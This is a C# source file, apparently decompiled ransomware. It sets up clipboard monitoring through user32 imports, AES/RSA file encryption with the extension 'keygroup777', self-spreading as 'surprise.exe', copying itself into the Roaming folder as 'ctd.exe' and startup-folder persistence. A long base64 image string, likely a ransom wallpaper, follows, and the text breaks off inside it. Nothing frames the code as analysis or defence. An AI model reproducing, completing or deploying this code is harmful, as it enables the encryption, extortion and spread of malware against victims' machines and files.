using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "keygroup777";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "ctd.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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